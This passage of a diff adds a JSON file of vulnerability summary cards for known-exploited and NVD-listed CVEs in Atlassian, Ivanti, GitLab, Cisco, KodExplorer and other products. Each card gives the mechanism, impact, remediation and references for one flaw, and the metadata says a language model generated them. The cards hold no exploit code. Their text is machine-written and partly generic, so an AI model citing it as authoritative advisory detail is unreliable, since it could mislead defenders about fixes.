@@ -1,0 +1,1679 @@
+[
+  {
+    "Item_ID": "cisa-kev-cve-2026-21589",
+    "CVE_ID": "CVE-2026-21589",
+    "Title": "CVE-2026-21589 - Atlassian Multiple Products Files or Directories Accessible to External Parties Vulnerability",
+    "Source_URL": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?search_api_fulltext=CVE-2026-21589",
+    "Content_Hash": "0b41a3139daf50e0531c2dff45f3ff1badc3eb36fc68b304cffc0a22dd9ded13",
+    "chunk_ids": [
+      "cisa-kev-cve-2026-21589::t1::000"
+    ],
+    "retrieval": "file",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-01T13:51:11.350611+00:00",
+    "card": {
+      "mechanism": "The vulnerability in multiple Atlassian products allows unauthenticated attackers to access specific files within the web application root directory due to improper file or directory access controls.",
+      "impact": "An unauthenticated attacker can gain access to sensitive files in the web application root directory, potentially leading to information disclosure. This affects versions of Bitbucket Data Center, Confluence Data Center, Jira Service Management Data Center, Jira Software Data Center, Bamboo Data Center, Crowd Data Center, Crucible, and Fisheye.",
+      "testing_syntax": [],
+      "remediation": "Apply the mitigations provided by Atlassian in accordance with CISA’s BOD 26-04 guidance. Ensure compliance with patching guidelines and evaluate the internet exposure of each affected asset.",
+      "references": [
+        "https://confluence.atlassian.com/security/cve-2026-21589-arbitrary-file-access-vulnerability-impacts-multiple-products-1870495748.html?ref=labs.watchtowr.com",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-prioritizing-security-updates-based-risk",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-implementation-guidance-prioritizing-security-updates-based-risk",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-21589"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 5,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "cisa-kev-cve-2015-5477",
+    "CVE_ID": "CVE-2015-5477",
+    "Title": "CVE-2015-5477 - ISC BIND Data Processing Errors Vulnerability",
+    "Source_URL": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?search_api_fulltext=CVE-2015-5477",
+    "Content_Hash": "e5b568c21b72a36cabd0d715abb049d2572d54b3e64835db42e9dd94df5c343c",
+    "chunk_ids": [
+      "cisa-kev-cve-2015-5477::t1::000"
+    ],
+    "retrieval": "file",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-01T13:51:33.164841+00:00",
+    "card": {
+      "mechanism": "ISC BIND contains a data processing errors vulnerability that could allow remote attackers to cause a denial of service via TKEY queries.",
+      "impact": "Remote attackers can cause a denial of service in affected versions of ISC BIND.",
+      "testing_syntax": [],
+      "remediation": "Apply mitigations in accordance with vendor instructions and CISA’s BOD 26-04 guidance. Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable.",
+      "references": [
+        "https://web.archive.org/web/20150729014733/https://kb.isc.org/article/AA-01272",
+        "https://access.redhat.com/errata/RHSA-2015:1513.html",
+        "https://supportportal.juniper.net/s/article/2016-01-Security-Bulletin-Junos-Vulnerability-in-ISC-BIND-named-CVE-2015-5477",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-prioritizing-security-updates-based-risk",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-implementation-guidance-prioritizing-security-updates-based-risk",
+        "https://nvd.nist.gov/vuln/detail/CVE-2015-5477"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 8,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "cisa-kev-cve-2015-3306",
+    "CVE_ID": "CVE-2015-3306",
+    "Title": "CVE-2015-3306 - ProFTPD Improper Access Control Vulnerability",
+    "Source_URL": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?search_api_fulltext=CVE-2015-3306",
+    "Content_Hash": "1080a44d2bbd4da736f326f79b2f78262d82df429e73249d4f3b44d00da67524",
+    "chunk_ids": [
+      "cisa-kev-cve-2015-3306::t1::000"
+    ],
+    "retrieval": "file",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-01T13:51:53.866205+00:00",
+    "card": {
+      "mechanism": "ProFTPD contains an improper access control vulnerability that allows remote attackers to read and write to arbitrary files using the site cpfr and site cpto commands.",
+      "impact": "An attacker can exploit this vulnerability to read and write to arbitrary files on the server, affecting versions of ProFTPD that are not patched.",
+      "testing_syntax": [],
+      "remediation": "Apply mitigations in accordance with vendor instructions and follow CISA’s BOD 26-04 guidance for prioritizing security updates. Discontinue use of the product if mitigations are unavailable.",
+      "references": [
+        "http://www.proftpd.org/",
+        "https://lists.debian.org/debian-security-announce/2015/msg00154.html",
+        "https://lists.opensuse.org/archives/list/updates@lists.opensuse.org/message/WE6YZRG5UVXMGQ7IVDRYBPIWV4M6UUGM/",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-prioritizing-security-updates-based-risk",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-implementation-guidance-prioritizing-security-updates-based-risk",
+        "https://nvd.nist.gov/vuln/detail/CVE-2015-3306"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 7,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "cisa-kev-cve-2026-118527",
+    "CVE_ID": "CVE-2026-118527",
+    "Title": "CVE-2026-118527 - Ivanti Connect Secure Generation of Predictable Numbers or Identifiers Vulnerability",
+    "Source_URL": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?search_api_fulltext=CVE-2026-118527",
+    "Content_Hash": "9324f4298d5920e04d81f75bcc0a0518d0e9c30b6c7a89c6f8ed278fa6113b1e",
+    "chunk_ids": [
+      "cisa-kev-cve-2026-118527::t1::000"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-01T14:15:09.370085+00:00",
+    "card": {
+      "mechanism": "Ivanti Connect Secure is vulnerable to a predictable numbers or identifiers generation flaw, allowing a remote authenticated attacker to upload files with controlled content to a known location on disk.",
+      "impact": "An attacker can exploit this vulnerability to upload malicious files, potentially leading to further attacks when chained with CVE-2026-104935 and CVE-2026-111357. Affected versions are not specified.",
+      "testing_syntax": [],
+      "remediation": "Apply the mitigations provided by Ivanti and follow CISA’s BOD 26-04 guidance for prioritizing security updates. If mitigations are unavailable, discontinue use of the product.",
+      "references": [
+        "https://hub.ivanti.com/s/article/Security-Advisory-Ivanti-Connect-Secure-CVE-2026-104935?language=en_US",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-prioritizing-security-updates-based-risk",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-implementation-guidance-prioritizing-security-updates-based-risk",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-118527"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 7,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "cisa-kev-cve-2026-111357",
+    "CVE_ID": "CVE-2026-111357",
+    "Title": "CVE-2026-111357 - Ivanti Connect Secure Missing Authentication for Critical Function Vulnerability",
+    "Source_URL": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?search_api_fulltext=CVE-2026-111357",
+    "Content_Hash": "35337cd9027087923ab33af0778b527a8cecca88716551a8dc324b52d25b153a",
+    "chunk_ids": [
+      "cisa-kev-cve-2026-111357::t1::000"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-01T14:15:23.819577+00:00",
+    "card": {
+      "mechanism": "Ivanti Connect Secure contains a missing authentication for critical function vulnerability, allowing a local authenticated attacker to potentially exploit the system.",
+      "impact": "An attacker could chain this vulnerability with CVE-2026-104935 and CVE-2026-118527 to perform further attacks. The specific impact is not detailed in the excerpts.",
+      "testing_syntax": [],
+      "remediation": "Apply mitigations in accordance with vendor instructions and follow CISA’s BOD 26-04 guidance for prioritizing security updates based on risk. Discontinue use of the product if mitigations are unavailable.",
+      "references": [
+        "https://hub.ivanti.com/s/article/Security-Advisory-Ivanti-Connect-Secure-CVE-2026-104935?language=en_US",
+        "https://www.cisa.gov/news-events/alerts/2026/10/13/cisa-urges-patching-newly-exploited-vulnerability-ivanti-connect-secure",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-prioritizing-security-updates-based-risk",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-implementation-guidance-prioritizing-security-updates-based-risk",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-111357"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 8,
+      "failures": [],
+      "attempts": 2
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "nvd-cve-2026-116053",
+    "CVE_ID": "CVE-2026-116053",
+    "Title": "CVE-2026-116053 - A weakness has been identified in dbcli mycli up to 2.29.4/2.30.1. The impacted element is...",
+    "Source_URL": "https://nvd.nist.gov/vuln/detail/CVE-2026-116053",
+    "Content_Hash": "4e91cfd36d586aacab3b9dd3ad567ecc89985478831f78e45122cdcf4b218f0d",
+    "chunk_ids": [
+      "nvd-cve-2026-116053::t1::000"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-01T14:15:55.517538+00:00",
+    "card": {
+      "mechanism": "A weakness in the function source_special_command_is_safe of the file mycli/packages/special/source.py in dbcli mycli up to versions 2.29.4 and 2.30.1 allows for os command injection through manipulation.",
+      "impact": "An attacker with local access can exploit this vulnerability to inject and execute arbitrary commands, affecting versions 2.29.0 to 2.30.1.",
+      "testing_syntax": [],
+      "remediation": "Update dbcli mycli to a version later than 2.30.1 to mitigate this vulnerability.",
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-116053",
+        "https://vuldb.com/cve/CVE-2026-116053",
+        "https://vuldb.com/submit/995818",
+        "https://vuldb.com/vuln/426137",
+        "https://vuldb.com/vuln/426137/cti"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 10,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "portswigger-696ee508e20b",
+    "CVE_ID": null,
+    "Title": "Scalable Vector Grief",
+    "Source_URL": "https://portswigger.net/research/scalable-vector-grief",
+    "Content_Hash": "eae8bb55c74d699e770e2f8217e7ac9d633204807bf85075904823505ddcb52c",
+    "chunk_ids": [
+      "portswigger-696ee508e20b::t1::000"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-01T14:16:07.779543+00:00",
+    "card": {
+      "mechanism": "The flaw involves bypassing SVG sanitizers by using a response header to execute JavaScript in Firefox, even when the response body is harmless XML.",
+      "impact": "An attacker can execute JavaScript in Firefox, potentially leading to client-side security issues. The specific versions of the affected SVG sanitizers are not specified.",
+      "testing_syntax": [],
+      "remediation": "Ensure that SVG sanitizers are updated and configured to block or sanitize response headers that could be used to execute JavaScript.",
+      "references": [
+        "https://portswigger.net/research/scalable-vector-grief"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 1,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "nvd-cve-2026-116139",
+    "CVE_ID": "CVE-2026-116139",
+    "Title": "CVE-2026-116139 - WWBN AVideo 26.0 through 29.3.0 contains a stored cross-site scripting vulnerability that ...",
+    "Source_URL": "https://nvd.nist.gov/vuln/detail/CVE-2026-116139",
+    "Content_Hash": "abba2bc0b4e7be2e7152d22d8ce742cbecfc6503f28c57d5d0033ef121c6ce36",
+    "chunk_ids": [
+      "nvd-cve-2026-116139::t1::000"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-01T14:16:15.169129+00:00",
+    "card": {
+      "mechanism": "The stored cross-site scripting (XSS) vulnerability in WWBN AVideo 26.0 through 29.3.0 allows authenticated users to inject JavaScript via comments. The markDownToHTML() function preserves event-handler attributes in leading HTML blocks, enabling attackers to bypass the inline sanitizer.",
+      "impact": "An attacker can post a comment with a malicious img tag carrying an onerror handler, which executes in viewers' browsers under the application origin. This affects versions 26.0 through 29.3.0.",
+      "testing_syntax": [],
+      "remediation": "Update to a version of WWBN AVideo that has fixed this vulnerability. Ensure that the markDownToHTML() function properly sanitizes event-handler attributes.",
+      "references": [
+        "https://github.com/WWBN/AVideo/commit/f13587c59346b4bf0f449273021d29b869594559",
+        "https://github.com/WWBN/AVideo/security/advisories/GHSA-cx46-26xc-2w7f",
+        "https://www.vulncheck.com/advisories/wwbn-avideo-26.0-through-29.3.0-stored-xss-via-comment-markdown-rendering"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 5,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "cisa-kev-cve-2026-97229",
+    "CVE_ID": "CVE-2026-97229",
+    "Title": "CVE-2026-97229 - GitLab Community Edition and Enterprise Edition Integer Overflow or Wraparound Vulnerability",
+    "Source_URL": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?search_api_fulltext=CVE-2026-97229",
+    "Content_Hash": "d88d241d6d45dedfb75fe765d89682d976a10df44fb2204640d97dfbe0647b63",
+    "chunk_ids": [
+      "cisa-kev-cve-2026-97229::t1::000"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-01T14:33:34.496941+00:00",
+    "card": {
+      "mechanism": "The vulnerability arises from an integer overflow or wraparound issue in GitLab Community Edition and Enterprise Edition, which can be exploited by an unauthenticated user through a specially crafted regular expression in a CI/CD configuration.",
+      "impact": "An attacker can execute arbitrary code on the GitLab server, affecting versions of GitLab Community Edition and Enterprise Edition that are not patched.",
+      "testing_syntax": [],
+      "remediation": "Apply the mitigations provided by GitLab in accordance with CISA’s BOD 26-04 guidance. Ensure compliance with patching guidelines and evaluate the internet exposure of affected assets.",
+      "references": [
+        "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?search_api_fulltext=CVE-2026-97229",
+        "https://www.ruby-lang.org/en/news/2026/10/23/regexp-fixes-for-gitlab-cves",
+        "https://docs.gitlab.com/releases/patches/patch-release-gitlab-19-4-2-released/",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-prioritizing-security-updates-based-risk",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-implementation-guidance-prioritizing-security-updates-based-risk",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-97229"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 8,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "cisa-kev-cve-2026-76418",
+    "CVE_ID": "CVE-2026-76418",
+    "Title": "CVE-2026-76418 - Cisco Secure Firewall ASA Software and Cisco Secure FTD Software Unchecked Return Value to NULL Pointer Dereference Vulnerability",
+    "Source_URL": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?search_api_fulltext=CVE-2026-76418",
+    "Content_Hash": "f0167d9ada09731124f0052811d5d4d8934433b0c6b7b97663823c20e306fa45",
+    "chunk_ids": [
+      "cisa-kev-cve-2026-76418::t1::000"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-01T14:33:50.999150+00:00",
+    "card": {
+      "mechanism": "The vulnerability arises from an unchecked return value that can lead to a NULL pointer dereference, causing the device to reload unexpectedly.",
+      "impact": "An unauthenticated, remote attacker can exploit this vulnerability to cause a denial of service (DoS) condition, affecting versions of Cisco Secure Firewall ASA Software and Cisco Secure FTD Software.",
+      "testing_syntax": [],
+      "remediation": "Apply the mitigations provided by Cisco in accordance with CISA’s BOD 26-04 guidance. Ensure compliance with the patching guidelines and follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable.",
+      "references": [
+        "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-tunnel-dos-s6mgkb75",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-prioritizing-security-updates-based-risk",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-implementation-guidance-prioritizing-security-updates-based-risk",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-76418"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 6,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "cisa-kev-cve-2026-41709",
+    "CVE_ID": "CVE-2026-41709",
+    "Title": "CVE-2026-41709 - Broadcom VMWare ESX Insufficient Logging Vulnerability",
+    "Source_URL": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?search_api_fulltext=CVE-2026-41709",
+    "Content_Hash": "20d1b984780650dc93b3d049669e512eb4c0af1c0c3d85f1846258c3a7ffa75e",
+    "chunk_ids": [
+      "cisa-kev-cve-2026-41709::t1::000"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-01T14:34:05.281195+00:00",
+    "card": {
+      "mechanism": "The vulnerability in Broadcom VMware ESX allows a malicious actor with admin access to perform certain operations without these actions being logged, due to insufficient logging mechanisms.",
+      "impact": "An attacker with admin access can perform unauthorized operations without leaving a trace in the logs, affecting versions of Broadcom VMware ESX that have not been mitigated.",
+      "testing_syntax": [],
+      "remediation": "Apply the mitigations provided by the vendor and follow CISA’s BOD 26-04 guidance for prioritizing security updates. Ensure compliance with CISA’s ‘Forensics Triage Requirements’.",
+      "references": [
+        "https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/38017",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-prioritizing-security-updates-based-risk",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-implementation-guidance-prioritizing-security-updates-based-risk",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-41709"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 5,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "nvd-cve-2026-116055",
+    "CVE_ID": "CVE-2026-116055",
+    "Title": "CVE-2026-116055 - A vulnerability was detected in SourceCodester Performance Indicator System 1.0. This impa...",
+    "Source_URL": "https://nvd.nist.gov/vuln/detail/CVE-2026-116055",
+    "Content_Hash": "bb893f5e27bc53f55b0cdde7bdceedd5e94cec91d29e6289dc7fbdb3668a035d",
+    "chunk_ids": [
+      "nvd-cve-2026-116055::t1::000"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-01T14:34:18.813733+00:00",
+    "card": {
+      "mechanism": "The vulnerability in SourceCodester Performance Indicator System 1.0 allows an attacker to manipulate the ID argument in the /opils/admin/deleteproduct.php file, leading to SQL injection.",
+      "impact": "An attacker can exploit this vulnerability remotely to perform SQL injection, potentially leading to data manipulation or unauthorized access. Versions 1.0 are affected.",
+      "testing_syntax": [],
+      "remediation": "To mitigate this vulnerability, ensure that input validation and sanitization are implemented for the ID parameter in the /opils/admin/deleteproduct.php file.",
+      "references": [
+        "https://github.com/hubdk01/cve/issues/5",
+        "https://vuldb.com/cve/CVE-2026-116055",
+        "https://vuldb.com/submit/997518",
+        "https://vuldb.com/vuln/426139",
+        "https://vuldb.com/vuln/426139/cti",
+        "https://www.sourcecodester.com/"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 9,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "nvd-cve-2026-116056",
+    "CVE_ID": "CVE-2026-116056",
+    "Title": "CVE-2026-116056 - A flaw has been found in KodCloud KodExplorer up to 4.56. Affected is the function request...",
+    "Source_URL": "https://nvd.nist.gov/vuln/detail/CVE-2026-116056",
+    "Content_Hash": "f2601eeb6da1611fad617467bfdd9e79952d164187f4f2cd7e4e0bb81af87b11",
+    "chunk_ids": [
+      "nvd-cve-2026-116056::t1::000"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-01T14:34:37.170128+00:00",
+    "card": {
+      "mechanism": "A flaw in the function request_url_safe of the file app/function/web.function.php in KodCloud KodExplorer up to version 4.56 allows for server-side request forgery (SSRF).",
+      "impact": "An attacker can remotely exploit this vulnerability to initiate server-side requests, potentially leading to unauthorized access or data exfiltration. All versions up to 4.56 are affected.",
+      "testing_syntax": [],
+      "remediation": "Update KodCloud KodExplorer to a version later than 4.56 to mitigate this vulnerability.",
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-116056",
+        "https://vuldb.com/cve/CVE-2026-116056",
+        "https://vuldb.com/submit/997517",
+        "https://vuldb.com/vuln/426140",
+        "https://vuldb.com/vuln/426140/cti"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 7,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "nvd-cve-2026-116057",
+    "CVE_ID": "CVE-2026-116057",
+    "Title": "CVE-2026-116057 - A vulnerability has been found in KodCloud KodExplorer up to 4.55. Affected by this vulner...",
+    "Source_URL": "https://nvd.nist.gov/vuln/detail/CVE-2026-116057",
+    "Content_Hash": "5feb198e2e3057ce6153ab18a3b0136d7ac95df9fff45bd714091d522eeca5c7",
+    "chunk_ids": [
+      "nvd-cve-2026-116057::t1::000"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-01T14:34:52.733617+00:00",
+    "card": {
+      "mechanism": "The vulnerability in KodCloud KodExplorer up to version 4.55 allows an attacker to manipulate the 'path/filestr' argument in the Online Editor Save Endpoint, leading to unrestricted file upload.",
+      "impact": "An attacker can remotely exploit this vulnerability to upload arbitrary files, potentially leading to further attacks. All versions up to 4.55 are affected.",
+      "testing_syntax": [],
+      "remediation": "Update KodCloud KodExplorer to a version later than 4.55 to mitigate this vulnerability.",
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-116057",
+        "https://vuldb.com/cve/CVE-2026-116057",
+        "https://vuldb.com/submit/997520",
+        "https://vuldb.com/vuln/426141",
+        "https://vuldb.com/vuln/426141/cti"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 7,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "nvd-cve-2026-116058",
+    "CVE_ID": "CVE-2026-116058",
+    "Title": "CVE-2026-116058 - A vulnerability was found in Alfresco Activiti up to 7.21.0-rc.692. Affected by this issue...",
+    "Source_URL": "https://nvd.nist.gov/vuln/detail/CVE-2026-116058",
+    "Content_Hash": "007a5f4fde744b96816c7c5b7032317888a64707d241ba10deb2961deb591710",
+    "chunk_ids": [
+      "nvd-cve-2026-116058::t1::000"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-01T14:35:05.004880+00:00",
+    "card": {
+      "mechanism": "A vulnerability in the JuelScriptEngine.eval function of Alfresco Activiti up to 7.21.0-rc.692 allows for code injection through remote manipulation.",
+      "impact": "An attacker can exploit this vulnerability to inject code, potentially leading to unauthorized access and data manipulation. Versions up to 7.21.0-rc.692 are affected.",
+      "testing_syntax": [],
+      "remediation": "Update to a version of Alfresco Activiti that addresses this vulnerability. If an update is not available, consider implementing additional security controls to mitigate the risk.",
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-116058",
+        "https://vuldb.com/cve/CVE-2026-116058",
+        "https://vuldb.com/submit/997843",
+        "https://vuldb.com/vuln/426142",
+        "https://vuldb.com/vuln/426142/cti"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 7,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "nvd-cve-2026-115817",
+    "CVE_ID": "CVE-2026-115817",
+    "Title": "CVE-2026-115817 - Starman versions before 0.4019 for Perl allow a stalled request body to hold a worker inde...",
+    "Source_URL": "https://nvd.nist.gov/vuln/detail/CVE-2026-115817",
+    "Content_Hash": "339060c6dd8002a3bcab99600fc02c9373d26d8f240e683e8005cb289fadd182",
+    "chunk_ids": [
+      "nvd-cve-2026-115817::t1::000"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-01T16:08:04.426944+00:00",
+    "card": {
+      "mechanism": "Starman versions before 0.4019 for Perl allow a remote attacker to hold a worker indefinitely by sending a request with complete headers and then stalling or trickling the body. This is because the read_timeout only applies to headers, not the request body.",
+      "impact": "A remote attacker can exploit this vulnerability to take over all workers with a few connections, causing the server to stop answering requests. This affects Starman versions before 0.4019.",
+      "testing_syntax": [],
+      "remediation": "Upgrade to Starman version 0.4019 or later, which applies read_timeout to each wait for body data and adds a body_timeout limit of 300 seconds by default.",
+      "references": [
+        "https://github.com/miyagawa/Starman/commit/89dffd3bdc9baa1cbe1b48a43615586ba2588558.patch",
+        "https://github.com/miyagawa/Starman/commit/a30533c03051502d6b67cd48b3a95a61e129691b.patch",
+        "https://metacpan.org/release/MIYAGAWA/Starman-0.4019/changes"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 4,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "nvd-cve-2026-116230",
+    "CVE_ID": "CVE-2026-116230",
+    "Title": "CVE-2026-116230 - A vulnerability was identified in Ndemic Creations Plague Inc Evolved up to 1.24.0.3. The ...",
+    "Source_URL": "https://nvd.nist.gov/vuln/detail/CVE-2026-116230",
+    "Content_Hash": "231060a715feebf68de5353e729e4ebd907246b3cda0d2ab1692107ebee19d15",
+    "chunk_ids": [
+      "nvd-cve-2026-116230::t1::000"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-02T07:35:14.724386+00:00",
+    "card": {
+      "mechanism": "A vulnerability exists in the Workshop Scenario Loader component of Ndemic Creations Plague Inc Evolved up to version 1.24.0.3, where an unknown function is susceptible to deserialization attacks, allowing remote manipulation.",
+      "impact": "An attacker can exploit this vulnerability to perform deserialization attacks, potentially leading to remote code execution. Versions 1.24.0.0 to 1.24.0.3 are affected.",
+      "testing_syntax": [],
+      "remediation": "Upgrade to version 1.24.0.4 to fix the vulnerability.",
+      "references": [
+        "https://drbloop.dev/blog/one-click-rce-plauge-inc",
+        "https://store.steampowered.com/news/app/246620/view/708909893000628135",
+        "https://vuldb.com/cve/CVE-2026-116230",
+        "https://vuldb.com/submit/1007147",
+        "https://vuldb.com/vuln/426279",
+        "https://vuldb.com/vuln/426279/cti"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 11,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "nvd-cve-2026-116231",
+    "CVE_ID": "CVE-2026-116231",
+    "Title": "CVE-2026-116231 - A security flaw has been discovered in Oray Pugongying X5 Pro 7.6.1. The impacted element ...",
+    "Source_URL": "https://nvd.nist.gov/vuln/detail/CVE-2026-116231",
+    "Content_Hash": "52149f89787a6a7ed590e5eb2534a5daec6f703176d4255f06f7234835de29fc",
+    "chunk_ids": [
+      "nvd-cve-2026-116231::t1::000"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-02T07:35:28.482402+00:00",
+    "card": {
+      "mechanism": "A security flaw in Oray Pugongying X5 Pro 7.6.1 allows remote attackers to manipulate the 'regmsg' argument, leading to CRLF injection in the Ser2net component.",
+      "impact": "An attacker can exploit this vulnerability remotely to perform CRLF injection, potentially leading to high impact on confidentiality, integrity, and availability. Affected versions include 7.6.1.",
+      "testing_syntax": [],
+      "remediation": "Update to a version of Oray Pugongying X5 Pro that addresses this vulnerability. If no update is available, consider alternative mitigations such as network segmentation or firewall rules to restrict access to the affected component.",
+      "references": [
+        "https://app.notion.com/p/Oray-Pgyer-X5-Pro-Router-7-6-1-A-Serial-Banner-Newline-Lets-ser2net-Overwrite-Existing-Files-3ea797159f158019b687eadcc7d6a85b",
+        "https://vuldb.com/cve/CVE-2026-116231",
+        "https://vuldb.com/submit/1005078",
+        "https://vuldb.com/vuln/426280",
+        "https://vuldb.com/vuln/426280/cti"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 7,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "nvd-cve-2026-96581",
+    "CVE_ID": "CVE-2026-96581",
+    "Title": "CVE-2026-96581 - Authorization Bypass Through User-Controlled Key vulnerability in ash-project ash allows a...",
+    "Source_URL": "https://nvd.nist.gov/vuln/detail/CVE-2026-96581",
